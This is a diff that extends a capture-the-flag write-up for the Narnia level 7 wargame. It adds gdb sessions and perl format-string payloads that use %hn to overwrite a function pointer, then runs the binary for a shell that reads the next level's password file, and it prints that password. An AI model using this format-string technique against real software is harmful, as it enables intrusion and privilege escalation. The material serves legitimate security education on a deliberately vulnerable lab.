@@ -16,6 +16,8 @@ cd /narnia ; ls -al
 
 ![](0.png)
 
+![](1.png)
+
 
 Let's look at the code:
 
@@ -95,7 +97,113 @@ int hackedfunction(){
 }
 ```
 
-## Password for the next level:
+So, is it possible to change `ptrf` to be the address of `hackedfunction()`, instead of `goodfunction()`?
+
+Let's look at the stack memory after printing `format` to `buffer` (after `snprintf`):
+
+```
+gdb ./narnia7
+```
+```
+disas vuln
 ```
 
+![](2.png)
+
+```
+b *0x080492b0
+```
+```
+r $(perl -e 'print "A"x127')
+```
+
+![](3.png)
+
+* Yellow - This is `ptrf`, the address of `goodfunction()`
+* Green - This is the `buffer`, contanis the content fron the user...
+
+We would like to do the following:
+* Changing the content of the address **0xffffd3f8** (`$sp`) from **0x080492fa** (`goodfunction` address) to **0x0804931f** (`hackedfunction` address).
+* Therefore the input string will be like this:<br />
+      ```
+      r $(perl -e 'print "\xf8\xd3\xff\xff" . "A"x(0x0804931f - 4) . "%n"')
+      ```
+* But since our target address is not at the top of the stack right now but a WORD away, we'll have to make `snprintf` "move" one. We will do this with "%x" like this:<br />
+        ```
+     r $(perl -e 'print "\xf8\xd3\xff\xff" . "A"x(0x0804931f - 4) . "%x" ."%n"')
+        ```
+
+Unfortunately, the input is too large.
+
+![](4.png)
+
+So what can we do? Good question.
+We will have to pay attention to the following fact:
+* The address of `goodfunction` is **0x080492fa**
+* The address of `hackedfunction` is **0x0804931f**
+* That is, the only change in the content is **the last two bytes**. Luckily, as we used `"%n"` to write a WORD-sized value into the address 0xffffd3f8 we can use `"%hn"` to write only two bytes (half a WORD)
+* This way we can reduce the size of the input to **0x931f** only:
+
+Let's try this:
+```
+r $(perl -e 'print "\xf8\xd3\xff\xff" . "%x" . "A"x(0x931f-4-2) . "%hn"')
+```
+```
+x/40wx $sp
+```
+
+![](5.png)
+
+We will notice (this also happened in previous challenges) that when the size of the input changes, so do the addresses of the stack. So now we will adjust the correct address:
+
+```
+r $(perl -e 'print "\x58\x41\xff\xff" . "%x" . "A"x(0x931f-4-2) . "%hn"')
+```
+```
+x/40wx $sp
+```
+
+![](6.png)
+
+Almost.<br />
+We subtract a little from the input size:
+
+```
+r $(perl -e 'print "\x58\x41\xff\xff" . "%x" . "A"x(0x931f-11) . "%hn"')
+```
+
+![](7.png)
+
+excellent! Now `ptrf` is actually the `hackedfunction`. We can verify this when we continue the program and enter the shell:
+```
+c
+```
+
+![](8.png)
+
+All that remains is to do this process outside of gdb, and that's it!
+```
+exit
+```
+```
+exit
+```
+```
+./narnia7 $(perl -e 'print "\x78\x41\xff\xff" . "%x" . "A"x(0x931f-6) . "%hn"')
+```
+```
+id
+```
+```
+whoami
+```
+```
+cat /etc/narnia_pass/narnia8
+```
+
+![](9.png)
+
+## Password for the next level:
+```
+1aBcDgPttG
 ```
